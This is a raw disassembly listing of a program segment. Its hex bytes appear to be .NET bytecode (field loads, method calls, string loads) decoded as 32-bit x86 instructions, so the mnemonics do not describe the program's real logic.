  403a5f:	02 7b 30             	add    0x30(%ebx),%bh
  403a62:	00 00                	add    %al,(%eax)
  403a64:	04 06                	add    $0x6,%al
  403a66:	6f                   	outsl  %ds:(%esi),(%dx)
  403a67:	86 00                	xchg   %al,(%eax)
  403a69:	00 0a                	add    %cl,(%edx)
  403a6b:	7b 33                	jnp    0x403aa0
  403a6d:	00 00                	add    %al,(%eax)
  403a6f:	04 16                	add    $0x16,%al
  403a71:	6f                   	outsl  %ds:(%esi),(%dx)
  403a72:	1b 00                	sbb    (%eax),%eax
  403a74:	00 0a                	add    %cl,(%edx)
  403a76:	02 7b 2d             	add    0x2d(%ebx),%bh
  403a79:	00 00                	add    %al,(%eax)
  403a7b:	04 06                	add    $0x6,%al
  403a7d:	33 07                	xor    (%edi),%eax
  403a7f:	02 15 7d 2d 00 00    	add    0x2d7d,%dl
  403a85:	04 03                	add    $0x3,%al
  403a87:	6f                   	outsl  %ds:(%esi),(%dx)
  403a88:	a1 00 00 0a 16       	mov    0x160a0000,%eax
  403a8d:	32 60 12             	xor    0x12(%eax),%ah
  403a90:	09 16                	or     %edx,(%esi)
  403a92:	16                   	push   %ss
  403a93:	03 6f a1             	add    -0x5f(%edi),%ebp
  403a96:	00 00                	add    %al,(%eax)
  403a98:	0a 28                	or     (%eax),%ch
  403a9a:	a2 00 00 0a 02       	mov    %al,0x20a0000
  403a9f:	7b 30                	jnp    0x403ad1
  403aa1:	00 00                	add    %al,(%eax)
  403aa3:	04 06                	add    $0x6,%al
  403aa5:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa6:	86 00                	xchg   %al,(%eax)
  403aa8:	00 0a                	add    %cl,(%edx)
  403aaa:	7b 34                	jnp    0x403ae0
  403aac:	00 00                	add    %al,(%eax)
  403aae:	04 72                	add    $0x72,%al
  403ab0:	07                   	pop    %es
  403ab1:	01 00                	add    %eax,(%eax)
  403ab3:	70 72                	jo     0x403b27
  403ab5:	29 01                	sub    %eax,(%ecx)
  403ab7:	00 70 12             	add    %dh,0x12(%eax)
  403aba:	09 28                	or     %ebp,(%eax)
  403abc:	a3 00 00 0a 69       	mov    %eax,0x690a0000
  403ac1:	8c 5d 00             	mov    %ds,0x0(%ebp)
  403ac4:	00 01                	add    %al,(%ecx)
  403ac6:	12 09                	adc    (%ecx),%cl
  403ac8:	28 a4 00 00 0a 8c 5d 	sub    %ah,0x5d8c0a00(%eax,%eax,1)
  403acf:	00 00                	add    %al,(%eax)
  403ad1:	01 12                	add    %edx,(%edx)
  403ad3:	09 28                	or     %ebp,(%eax)
  403ad5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403ad6:	00 00                	add    %al,(%eax)
  403ad8:	0a 8c 5d 00 00 01 28 	or     0x28010000(%ebp,%ebx,2),%cl
  403adf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403ae0:	00 00                	add    %al,(%eax)
  403ae2:	0a 28                	or     (%eax),%ch
  403ae4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403ae5:	00 00                	add    %al,(%eax)
  403ae7:	0a 6f 31             	or     0x31(%edi),%ch
  403aea:	00 00                	add    %al,(%eax)
  403aec:	0a 2b                	or     (%ebx),%ch
  403aee:	1b 02                	sbb    (%edx),%eax
  403af0:	7b 30                	jnp    0x403b22
  403af2:	00 00                	add    %al,(%eax)
  403af4:	04 06                	add    $0x6,%al
  403af6:	6f                   	outsl  %ds:(%esi),(%dx)
  403af7:	86 00                	xchg   %al,(%eax)
  403af9:	00 0a                	add    %cl,(%edx)
  403afb:	7b 34                	jnp    0x403b31
  403afd:	00 00                	add    %al,(%eax)
  403aff:	04 72                	add    $0x72,%al
  403b01:	01 00                	add    %eax,(%eax)
  403b03:	00 70 6f             	add    %dh,0x6f(%eax)
  403b06:	31 00                	xor    %eax,(%eax)
  403b08:	00 0a                	add    %cl,(%edx)
  403b0a:	03 6f a8             	add    -0x58(%edi),%ebp
  403b0d:	00 00                	add    %al,(%eax)
  403b0f:	0a 28                	or     (%eax),%ch
  403b11:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403b16:	1e                   	push   %ds
  403b17:	02 7b 30             	add    0x30(%ebx),%bh
  403b1a:	00 00                	add    %al,(%eax)
  403b1c:	04 06                	add    $0x6,%al
  403b1e:	6f                   	outsl  %ds:(%esi),(%dx)
  403b1f:	86 00                	xchg   %al,(%eax)
  403b21:	00 0a                	add    %cl,(%edx)
  403b23:	7b 35                	jnp    0x403b5a
  403b25:	00 00                	add    %al,(%eax)
  403b27:	04 03                	add    $0x3,%al
  403b29:	6f                   	outsl  %ds:(%esi),(%dx)
  403b2a:	a8 00                	test   $0x0,%al
  403b2c:	00 0a                	add    %cl,(%edx)
  403b2e:	6f                   	outsl  %ds:(%esi),(%dx)
  403b2f:	31 00                	xor    %eax,(%eax)
  403b31:	00 0a                	add    %cl,(%edx)
  403b33:	2b 1b                	sub    (%ebx),%ebx
  403b35:	02 7b 30             	add    0x30(%ebx),%bh
  403b38:	00 00                	add    %al,(%eax)
  403b3a:	04 06                	add    $0x6,%al
  403b3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403b3d:	86 00                	xchg   %al,(%eax)
  403b3f:	00 0a                	add    %cl,(%edx)
  403b41:	7b 35                	jnp    0x403b78
  403b43:	00 00                	add    %al,(%eax)
  403b45:	04 72                	add    $0x72,%al
  403b47:	01 00                	add    %eax,(%eax)
  403b49:	00 70 6f             	add    %dh,0x6f(%eax)
  403b4c:	31 00                	xor    %eax,(%eax)
  403b4e:	00 0a                	add    %cl,(%edx)
  403b50:	28 a9 00 00 0a 2a    	sub    %ch,0x2a0a0000(%ecx)
  403b56:	00 00                	add    %al,(%eax)
  403b58:	03 30                	add    (%eax),%esi
  403b5a:	02 00                	add    (%eax),%al
  403b5c:	40                   	inc    %eax
  403b5d:	00 00                	add    %al,(%eax)
  403b5f:	00 00                	add    %al,(%eax)
  403b61:	00 00                	add    %al,(%eax)
  403b63:	00 02                	add    %al,(%edx)
  403b65:	1f                   	pop    %ds
  403b66:	0c 7d                	or     $0x7d,%al
  403b68:	3a 00                	cmp    (%eax),%al
  403b6a:	00 04 02             	add    %al,(%edx,%eax,1)
  403b6d:	1f                   	pop    %ds
  403b6e:	0e                   	push   %cs
  403b6f:	7d 3c                	jge    0x403bad
  403b71:	00 00                	add    %al,(%eax)
  403b73:	04 02                	add    $0x2,%al
  403b75:	1f                   	pop    %ds
  403b76:	0e                   	push   %cs
  403b77:	7d 3e                	jge    0x403bb7
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	04 02                	add    $0x2,%al
  403b7d:	1f                   	pop    %ds
  403b7e:	0e                   	push   %cs
  403b7f:	7d 40                	jge    0x403bc1
  403b81:	00 00                	add    %al,(%eax)
  403b83:	04 02                	add    $0x2,%al
  403b85:	19 7d 42             	sbb    %edi,0x42(%ebp)
  403b88:	00 00                	add    %al,(%eax)
  403b8a:	04 02                	add    $0x2,%al
  403b8c:	19 7d 43             	sbb    %edi,0x43(%ebp)
  403b8f:	00 00                	add    %al,(%eax)
  403b91:	04 02                	add    $0x2,%al
  403b93:	28 aa 00 00 0a 02    	sub    %ch,0x20a0000(%edx)
  403b99:	73 1e                	jae    0x403bb9
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	06                   	push   %es
  403b9e:	7d 39                	jge    0x403bd9
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	04 2a                	add    $0x2a,%al
  403ba4:	1b 30                	sbb    (%eax),%esi
  403ba6:	08 00                	or     %al,(%eax)
  403ba8:	2e 03 00             	add    %cs:(%eax),%eax
  403bab:	00 0b                	add    %cl,(%ebx)
  403bad:	00 00                	add    %al,(%eax)
  403baf:	11 03                	adc    %eax,(%ebx)
  403bb1:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  403bb7:	08 04 28             	or     %al,(%eax,%ebp,1)
  403bba:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403bbf:	2d 28 28 00 00       	sub    $0x2828,%eax
  403bc4:	0a 6f 29             	or     0x29(%edi),%ch
  403bc7:	00 00                	add    %al,(%eax)
  403bc9:	0a 0a                	or     (%edx),%cl
  403bcb:	72 01                	jb     0x403bce
  403bcd:	00 00                	add    %al,(%eax)
  403bcf:	70 0b                	jo     0x403bdc
  403bd1:	03 28                	add    (%eax),%ebp
  403bd3:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403bd8:	02 03                	add    (%ebx),%al
  403bda:	0a 04 28             	or     (%eax,%ebp,1),%al
  403bdd:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403be2:	02 04 0b             	add    (%ebx,%ecx,1),%al
  403be5:	07                   	pop    %es
  403be6:	06                   	push   %es
  403be7:	28 ab 00 00 0a 26    	sub    %ch,0x260a0000(%ebx)
  403bed:	02 72 01             	add    0x1(%edx),%dh
  403bf0:	00 00                	add    %al,(%eax)
  403bf2:	70 7d                	jo     0x403c71
  403bf4:	44                   	inc    %esp
  403bf5:	00 00                	add    %al,(%eax)
  403bf7:	04 73                	add    $0x73,%al
  403bf9:	ac                   	lods   %ds:(%esi),%al
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	0a 0c 05 6f ad 00 00 	or     0xad6f(,%eax,1),%cl
  403c03:	0a 13                	or     (%ebx),%dl
  403c05:	13 38                	adc    (%eax),%edi
  403c07:	ac                   	lods   %ds:(%esi),%al
  403c08:	02 00                	add    (%eax),%al
  403c0a:	00 11                	add    %dl,(%ecx)
  403c0c:	13 6f ae             	adc    -0x52(%edi),%ebp
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	0a 0d 14 13 04 09    	or     0x9041314,%cl
  403c17:	6f                   	outsl  %ds:(%esi),(%dx)
  403c18:	af                   	scas   %es:(%edi),%eax
  403c19:	00 00                	add    %al,(%eax)
  403c1b:	0a 28                	or     (%eax),%ch
  403c1d:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  403c22:	0e                   	push   %cs
  403c23:	d0 33                	shlb   $1,(%ebx)
  403c25:	00 00                	add    %al,(%eax)
  403c27:	01 28                	add    %ebp,(%eax)
  403c29:	b0 00                	mov    $0x0,%al
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  403c30:	0d 09 6f af 00       	or     $0xaf6f09,%eax
  403c35:	00 0a                	add    %cl,(%edx)
  403c37:	28 b1 00 00 0a 13    	sub    %dh,0x130a0000(%ecx)
  403c3d:	04 11                	add    $0x11,%al
  403c3f:	04 6f                	add    $0x6f,%al
  403c41:	b2 00                	mov    $0x0,%dl
  403c43:	00 0a                	add    %cl,(%edx)
  403c45:	39 1c 01             	cmp    %ebx,(%ecx,%eax,1)
  403c48:	00 00                	add    %al,(%eax)
  403c4a:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403c4d:	b3 00                	mov    $0x0,%bl
  403c4f:	00 0a                	add    %cl,(%edx)
  403c51:	13 05 72 53 01 00    	adc    0x15372,%eax
  403c57:	70 1f                	jo     0x403c78
  403c59:	60                   	pusha
  403c5a:	13 14 12             	adc    (%edx,%edx,1),%edx
  403c5d:	14 28                	adc    $0x28,%al
  403c5f:	b4 00                	mov    $0x0,%ah
  403c61:	00 0a                	add    %cl,(%edx)
  403c63:	72 93                	jb     0x403bf8
  403c65:	01 00                	add    %eax,(%eax)
  403c67:	70 28                	jo     0x403c91
  403c69:	b5 00                	mov    $0x0,%ch
  403c6b:	00 0a                	add    %cl,(%edx)
  403c6d:	28 b1 00 00 0a 13    	sub    %dh,0x130a0000(%ecx)
  403c73:	06                   	push   %es
  403c74:	11 06                	adc    %eax,(%esi)
  403c76:	17                   	pop    %ss
  403c77:	8d 60 00             	lea    0x0(%eax),%esp
  403c7a:	00 01                	add    %al,(%ecx)
  403c7c:	13 15 11 15 16 11    	adc    0x11161511,%edx
  403c82:	05 a2 11 15 6f       	add    $0x6f1511a2,%eax
  403c87:	b6 00                	mov    $0x0,%dh
  403c89:	00 0a                	add    %cl,(%edx)
  403c8b:	13 06                	adc    (%esi),%eax
  403c8d:	11 06                	adc    %eax,(%esi)
  403c8f:	20 14 02             	and    %dl,(%edx,%eax,1)
  403c92:	00 00                	add    %al,(%eax)
  403c94:	14 7e                	adc    $0x7e,%al
  403c96:	b7 00                	mov    $0x0,%bh
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	14 6f                	adc    $0x6f,%al
  403c9c:	b8 00 00 0a 13       	mov    $0x130a0000,%eax
  403ca1:	07                   	pop    %es
  403ca2:	11 07                	adc    %eax,(%edi)
  403ca4:	14 6f                	adc    $0x6f,%al
  403ca6:	b9 00 00 0a 13       	mov    $0x130a0000,%ecx
  403cab:	08 16                	or     %dl,(%esi)
  403cad:	13 09                	adc    (%ecx),%ecx
  403caf:	72 01                	jb     0x403cb2
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	70 13                	jo     0x403cc8
  403cb5:	0a 09                	or     (%ecx),%cl
  403cb7:	6f                   	outsl  %ds:(%esi),(%dx)
  403cb8:	ba 00 00 0a 28       	mov    $0x280a0000,%edx
  403cbd:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403cc2:	1d 02 72 97 01       	sbb    $0x1977202,%eax
  403cc7:	00 70 09             	add    %dh,0x9(%eax)
  403cca:	6f                   	outsl  %ds:(%esi),(%dx)
  403ccb:	ba 00 00 0a 11       	mov    $0x110a0000,%edx
  403cd0:	09 8c 5d 00 00 01 28 	or     %ecx,0x28010000(%ebp,%ebx,2)
  403cd7:	bb 00 00 0a 7d       	mov    $0x7d0a0000,%ebx
  403cdc:	44                   	inc    %esp
  403cdd:	00 00                	add    %al,(%eax)
  403cdf:	04 02                	add    $0x2,%al
  403ce1:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce2:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  403ce7:	0a 11                	or     (%ecx),%dl
  403ce9:	0a 28                	or     (%eax),%ch
  403ceb:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  403cf0:	02 de                	add    %dh,%bl
  403cf2:	3f                   	aas
  403cf3:	11 0a                	adc    %ecx,(%edx)
  403cf5:	11 05 28 bd 00 00    	adc    %eax,0xbd28
  403cfb:	0a 13                	or     (%ebx),%dl
  403cfd:	0b 11                	or     (%ecx),%edx
  403cff:	06                   	push   %es
  403d00:	72 ad                	jb     0x403caf
  403d02:	01 00                	add    %eax,(%eax)
  403d04:	70 20                	jo     0x403d26
  403d06:	14 01                	adc    $0x1,%al
  403d08:	00 00                	add    %al,(%eax)
  403d0a:	14 11                	adc    $0x11,%al
  403d0c:	08 17                	or     %dl,(%edi)
  403d0e:	8d 01                	lea    (%ecx),%eax
  403d10:	00 00                	add    %al,(%eax)
  403d12:	01 13                	add    %edx,(%ebx)
  403d14:	16                   	push   %ss
  403d15:	11 16                	adc    %edx,(%esi)
  403d17:	16                   	push   %ss
  403d18:	11 0b                	adc    %ecx,(%ebx)
  403d1a:	a2 11 16 6f be       	mov    %al,0xbe6f1611
  403d1f:	00 00                	add    %al,(%eax)
  403d21:	0a 26                	or     (%esi),%ah
  403d23:	de 05 13 0c 11 0c    	fiadds 0xc110c13
  403d29:	7a 11                	jp     0x403d3c
  403d2b:	09 17                	or     %edx,(%edi)
  403d2d:	58                   	pop    %eax
  403d2e:	13 09                	adc    (%ecx),%ecx
  403d30:	2b 84 11 06 72 b5 01 	sub    0x1b57206(%ecx,%edx,1),%eax
  403d37:	00 70 20             	add    %dh,0x20(%eax)
  403d3a:	14 01                	adc    $0x1,%al
  403d3c:	00 00                	add    %al,(%eax)
  403d3e:	14 11                	adc    $0x11,%al
  403d40:	08 14 6f             	or     %dl,(%edi,%ebp,2)
  403d43:	be 00 00 0a 74       	mov    $0x740a0000,%esi
  403d48:	68 00 00 01 13       	push   $0x13010000
  403d4d:	0d 08 09 6f ba       	or     $0xba6f0908,%eax
  403d52:	00 00                	add    %al,(%eax)
  403d54:	0a 11                	or     (%ecx),%dl
  403d56:	0d 73 bf 00 00       	or     $0xbf73,%eax
  403d5b:	0a 6f c0             	or     -0x40(%edi),%ch
  403d5e:	00 00                	add    %al,(%eax)
  403d60:	0a 38                	or     (%eax),%bh
  403d62:	51                   	push   %ecx
  403d63:	01 00                	add    %eax,(%eax)
  403d65:	00 14 13             	add    %dl,(%ebx,%edx,1)
  403d68:	0e                   	push   %cs
  403d69:	14 13                	adc    $0x13,%al
  403d6b:	0f 11 04 d0          	movups %xmm0,(%eax,%edx,8)
  403d6f:	22 00                	and    (%eax),%al
  403d71:	00 01                	add    %al,(%ecx)
  403d73:	28 b0 00 00 0a 28    	sub    %dh,0x280a0000(%eax)
  403d79:	c1 00 00             	roll   $0x0,(%eax)
  403d7c:	0a 39                	or     (%ecx),%bh
  403d7e:	e9 00 00 00 11       	jmp    0x11403d83
  403d83:	04 d0                	add    $0xd0,%al
  403d85:	21 00                	and    %eax,(%eax)
  403d87:	00 01                	add    %al,(%ecx)
  403d89:	28 b0 00 00 0a 28    	sub    %dh,0x280a0000(%eax)
  403d8f:	c1 00 00             	roll   $0x0,(%eax)
  403d92:	0a 39                	or     (%ecx),%bh
  403d94:	b1 00                	mov    $0x0,%cl
  403d96:	00 00                	add    %al,(%eax)
  403d98:	09 6f ba             	or     %ebp,-0x46(%edi)
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	0a 28                	or     (%eax),%ch
  403d9f:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403da4:	16                   	push   %ss
  403da5:	02 72 c5             	add    -0x3b(%edx),%dh
  403da8:	01 00                	add    %eax,(%eax)
  403daa:	70 09                	jo     0x403db5
  403dac:	6f                   	outsl  %ds:(%esi),(%dx)
  403dad:	ba 00 00 0a 28       	mov    $0x280a0000,%edx
  403db2:	c2 00 00             	ret    $0x0
  403db5:	0a 7d 44             	or     0x44(%ebp),%bh
  403db8:	00 00                	add    %al,(%eax)
  403dba:	04 09                	add    $0x9,%al
  403dbc:	6f                   	outsl  %ds:(%esi),(%dx)
  403dbd:	c3                   	ret
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	0a 28                	or     (%eax),%ch
  403dc2:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403dc7:	16                   	push   %ss
  403dc8:	02 25 7b 44 00 00    	add    0x447b,%ah
  403dce:	04 72                	add    $0x72,%al
  403dd0:	d1 01                	roll   $1,(%ecx)
  403dd2:	00 70 28             	add    %dh,0x28(%eax)
  403dd5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403dd6:	00 00                	add    %al,(%eax)
  403dd8:	0a 7d 44             	or     0x44(%ebp),%bh
  403ddb:	00 00                	add    %al,(%eax)
  403ddd:	04 02                	add    $0x2,%al
  403ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  403de0:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  403de5:	0f 11 0f             	movups %xmm1,(%edi)
  403de8:	72 fb                	jb     0x403de5
  403dea:	01 00                	add    %eax,(%eax)
  403dec:	70 28                	jo     0x403e16
  403dee:	c4 00                	les    (%eax),%eax
  403df0:	00 0a                	add    %cl,(%edx)
  403df2:	2c 0e                	sub    $0xe,%al
  403df4:	02 09                	add    (%ecx),%cl
  403df6:	6f                   	outsl  %ds:(%esi),(%dx)
  403df7:	c3                   	ret
  403df8:	00 00                	add    %al,(%eax)
  403dfa:	0a 6f c5             	or     -0x3b(%edi),%ch
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	0a 2b                	or     (%ebx),%ch
  403e01:	37                   	aaa
  403e02:	11 0f                	adc    %ecx,(%edi)
  403e04:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  403e0a:	08 09                	or     %cl,(%ecx)
  403e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e0d:	c6 00 00             	movb   $0x0,(%eax)
  403e10:	0a 13                	or     (%ebx),%dl
  403e12:	0e                   	push   %cs
  403e13:	11 0e                	adc    %ecx,(%esi)
  403e15:	2d 22 11 0f 11       	sub    $0x110f1122,%eax
  403e1a:	04 28                	add    $0x28,%al
  403e1c:	bd 00 00 0a 13       	mov    $0x130a0000,%ebp
  403e21:	0e                   	push   %cs
  403e22:	de 15 26 02 72 01    	ficoms 0x1720226
  403e28:	02 00                	add    (%eax),%al
  403e2a:	70 6f                	jo     0x403e9b
  403e2c:	c7 00 00 0a 72 fb    	movl   $0xfb720a00,(%eax)
  403e32:	01 00                	add    %eax,(%eax)
  403e34:	70 13                	jo     0x403e49
  403e36:	0f de 00             	pmaxub (%eax),%mm0
  403e39:	11 0f                	adc    %ecx,(%edi)
  403e3b:	72 fb                	jb     0x403e38
  403e3d:	01 00                	add    %eax,(%eax)
  403e3f:	70 28                	jo     0x403e69
  403e41:	c4 00                	les    (%eax),%eax
  403e43:	00 0a                	add    %cl,(%edx)
  403e45:	2d 97 2b 54 02       	sub    $0x2542b97,%eax
  403e4a:	72 01                	jb     0x403e4d
  403e4c:	00 00                	add    %al,(%eax)
  403e4e:	70 72                	jo     0x403ec2
  403e50:	01 00                	add    %eax,(%eax)
  403e52:	00 70 72             	add    %dh,0x72(%eax)
  403e55:	01 00                	add    %eax,(%eax)
  403e57:	00 70 72             	add    %dh,0x72(%eax)
  403e5a:	01 00                	add    %eax,(%eax)
  403e5c:	00 70 6f             	add    %dh,0x6f(%eax)
  403e5f:	c8 00 00 0a          	enter  $0x0,$0xa
  403e63:	13 10                	adc    (%eax),%edx
  403e65:	11 10                	adc    %edx,(%eax)
  403e67:	13 0e                	adc    (%esi),%ecx
  403e69:	2b 32                	sub    (%edx),%esi
  403e6b:	09 6f ba             	or     %ebp,-0x46(%edi)
  403e6e:	00 00                	add    %al,(%eax)
  403e70:	0a 28                	or     (%eax),%ch
  403e72:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403e77:	16                   	push   %ss
  403e78:	02 72 c5             	add    -0x3b(%edx),%dh
  403e7b:	01 00                	add    %eax,(%eax)
  403e7d:	70 09                	jo     0x403e88
  403e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  403e80:	ba 00 00 0a 28       	mov    $0x280a0000,%edx
  403e85:	c2 00 00             	ret    $0x0
  403e88:	0a 7d 44             	or     0x44(%ebp),%bh
  403e8b:	00 00                	add    %al,(%eax)
  403e8d:	04 14                	add    $0x14,%al
  403e8f:	13 11                	adc    (%ecx),%edx
  403e91:	02 6f c9             	add    -0x37(%edi),%ch
  403e94:	00 00                	add    %al,(%eax)
  403e96:	0a 13                	or     (%ebx),%dl
  403e98:	11 11                	adc    %edx,(%ecx)
  403e9a:	11 13                	adc    %edx,(%ebx)
  403e9c:	0e                   	push   %cs
  403e9d:	08 09                	or     %cl,(%ecx)
  403e9f:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea0:	ba 00 00 0a 11       	mov    $0x110a0000,%edx
  403ea5:	0e                   	push   %cs
  403ea6:	73 bf                	jae    0x403e67
  403ea8:	00 00                	add    %al,(%eax)
  403eaa:	0a 6f c0             	or     -0x40(%edi),%ch
  403ead:	00 00                	add    %al,(%eax)
  403eaf:	0a de                	or     %dh,%bl
  403eb1:	05 13 12 11 12       	add    $0x12111213,%eax
  403eb6:	7a 11                	jp     0x403ec9
  403eb8:	13 6f 5e             	adc    0x5e(%edi),%ebp
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	0a 3a                	or     (%edx),%bh
  403ebf:	48                   	dec    %eax
  403ec0:	fd                   	std
  403ec1:	ff                   	(bad)
  403ec2:	ff                   	lcall  (bad)
  403ec3:	de 0c 11             	fimuls (%ecx,%edx,1)
  403ec6:	13 2c 07             	adc    (%edi,%eax,1),%ebp
  403ec9:	11 13                	adc    %edx,(%ebx)
  403ecb:	6f                   	outsl  %ds:(%esi),(%dx)
  403ecc:	5f                   	pop    %edi
  403ecd:	00 00                	add    %al,(%eax)
  403ecf:	0a dc                	or     %ah,%bl
  403ed1:	02 72 01             	add    0x1(%edx),%dh
  403ed4:	00 00                	add    %al,(%eax)
  403ed6:	70 7d                	jo     0x403f55
  403ed8:	44                   	inc    %esp
  403ed9:	00 00                	add    %al,(%eax)
  403edb:	04 08                	add    $0x8,%al
  403edd:	2a 00                	sub    (%eax),%al
  403edf:	00 41 64             	add    %al,0x64(%ecx)
  403ee2:	00 00                	add    %al,(%eax)
  403ee4:	00 00                	add    %al,(%eax)
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	06                   	push   %es
  403ee9:	01 00                	add    %eax,(%eax)
  403eeb:	00 6f 00             	add    %ch,0x0(%edi)
  403eee:	00 00                	add    %al,(%eax)
  403ef0:	75 01                	jne    0x403ef3
  403ef2:	00 00                	add    %al,(%eax)
  403ef4:	05 00 00 00 69       	add    $0x69000000,%eax
  403ef9:	00 00                	add    %al,(%eax)
  403efb:	01 00                	add    %eax,(%eax)
  403efd:	00 00                	add    %al,(%eax)
  403eff:	00 67 02             	add    %ah,0x2(%edi)
  403f02:	00 00                	add    %al,(%eax)
  403f04:	0d 00 00 00 74       	or     $0x74000000,%eax
  403f09:	02 00                	add    (%eax),%al
  403f0b:	00 15 00 00 00 01    	add    %dl,0x1000000
  403f11:	00 00                	add    %al,(%eax)
  403f13:	01 00                	add    %eax,(%eax)
  403f15:	00 00                	add    %al,(%eax)
  403f17:	00 bc 01 00 00 46 01 	add    %bh,0x1460000(%ecx,%eax,1)
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	02 03                	add    (%ebx),%al
  403f22:	00 00                	add    %al,(%eax)
  403f24:	05 00 00 00 69       	add    $0x69000000,%eax
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	01 02                	add    %eax,(%edx)
  403f2d:	00 00                	add    %al,(%eax)
  403f2f:	00 56 00             	add    %dl,0x0(%esi)
  403f32:	00 00                	add    %al,(%eax)
  403f34:	bf 02 00 00 15       	mov    $0x15000002,%edi
  403f39:	03 00                	add    (%eax),%eax
  403f3b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f3e:	00 00                	add    %al,(%eax)
  403f40:	00 00                	add    %al,(%eax)
  403f42:	00 00                	add    %al,(%eax)
  403f44:	13 30                	adc    (%eax),%esi
  403f46:	04 00                	add    $0x0,%al
  403f48:	14 00                	adc    $0x0,%al
  403f4a:	00 00                	add    %al,(%eax)
  403f4c:	0c 00                	or     $0x0,%al
  403f4e:	00 11                	add    %dl,(%ecx)
  403f50:	05 0e 04 03 04       	add    $0x403040e,%eax
  403f55:	28 23                	sub    %ah,(%ebx)
  403f57:	00 00                	add    %al,(%eax)
  403f59:	06                   	push   %es
  403f5a:	0a 06                	or     (%esi),%al
  403f5c:	15 33 03 0e 04       	adc    $0x40e0333,%eax
  403f61:	0a 06                	or     (%esi),%al
  403f63:	2a 13                	sub    (%ebx),%dl
  403f65:	30 06                	xor    %al,(%esi)
  403f67:	00 51 00             	add    %dl,0x0(%ecx)
  403f6a:	00 00                	add    %al,(%eax)
  403f6c:	0d 00 00 11 03       	or     $0x3110000,%eax
  403f71:	04 0e                	add    $0xe,%al
  403f73:	04 05                	add    $0x5,%al
  403f75:	0e                   	push   %cs
  403f76:	05 0e 06 28 02       	add    $0x228060e,%eax
  403f7b:	00 00                	add    %al,(%eax)
  403f7d:	06                   	push   %es
  403f7e:	0a 06                	or     (%esi),%al
  403f80:	2c 3d                	sub    $0x3d,%al
  403f82:	73 ca                	jae    0x403f4e
  403f84:	00 00                	add    %al,(%eax)
  403f86:	0a 0b                	or     (%ebx),%cl
  403f88:	06                   	push   %es
  403f89:	7b 22                	jnp    0x403fad
  403f8b:	00 00                	add    %al,(%eax)
  403f8d:	04 6f                	add    $0x6f,%al
  403f8f:	cb                   	lret
  403f90:	00 00                	add    %al,(%eax)
  403f92:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  403f98:	12 09                	adc    (%ecx),%cl
  403f9a:	11 04 93             	adc    %eax,(%ebx,%edx,4)
  403f9d:	0c 07                	or     $0x7,%al
  403f9f:	08 6f cc             	or     %ch,-0x34(%edi)
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0a 11                	or     (%ecx),%dl
  403fa6:	04 17                	add    $0x17,%al
  403fa8:	58                   	pop    %eax
  403fa9:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403fac:	04 09                	add    $0x9,%al
  403fae:	8e 69 32             	mov    0x32(%ecx),%gs
  403fb1:	e7 06                	out    %eax,$0x6
  403fb3:	7b 21                	jnp    0x403fd6
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	04 07                	add    $0x7,%al
  403fb9:	73 cd                	jae    0x403f88
  403fbb:	00 00                	add    %al,(%eax)
  403fbd:	0a 2a                	or     (%edx),%ch
  403fbf:	14 2a                	adc    $0x2a,%al
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 13                	add    %dl,(%ebx)
  403fc5:	30 06                	xor    %al,(%esi)
  403fc7:	00 4f 00             	add    %cl,0x0(%edi)
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	0d 00 00 11 03       	or     $0x3110000,%eax
  403fd1:	04 0e                	add    $0xe,%al
  403fd3:	04 05                	add    $0x5,%al
  403fd5:	19 17                	sbb    %edx,(%edi)
  403fd7:	28 02                	sub    %al,(%edx)
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	06                   	push   %es
  403fdc:	0a 06                	or     (%esi),%al
  403fde:	2c 3d                	sub    $0x3d,%al
  403fe0:	73 ca                	jae    0x403fac
  403fe2:	00 00                	add    %al,(%eax)
  403fe4:	0a 0b                	or     (%ebx),%cl
  403fe6:	06                   	push   %es
  403fe7:	7b 22                	jnp    0x40400b
  403fe9:	00 00                	add    %al,(%eax)
  403feb:	04 6f                	add    $0x6f,%al
